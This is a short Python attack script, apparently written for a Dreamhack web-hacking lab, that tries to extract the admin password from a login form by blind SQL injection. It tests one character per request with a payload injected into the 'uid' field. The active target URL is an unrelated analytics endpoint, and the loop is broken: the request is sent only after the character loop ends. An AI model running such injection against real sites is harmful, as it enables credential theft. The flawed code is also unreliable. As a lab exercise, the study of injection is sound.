import requests
import string

def main() :
    # URL = "https://learn.dreamhack.io/labs/5c249803-825c-4c00-baee-ca70427ce084"
    URL = "https://us.i.posthog.com/i/v0/e/?ip=0&_=1784698433129&ver=1.302.2&compression=gzip-js"
    
    for i in range(1, 2) :
        for ch in string.printable :
            print(f"i : {i}, ch : {ch}")
            payload = f"guest\' and upw = IF (substr(SELECT upw FROM user_table WHERE uid = \'admin\', {i}, 1) = \'{ch}\', \'guest\')--"

        data = {
            "uid" : payload,
            "upw" : "test"
        }

        response = requests.post(URL, data=data)
        print("status_code : \n", response.status_code)
        print("text : \n", response.text)

    return


if __name__ == "__main__" :
    main()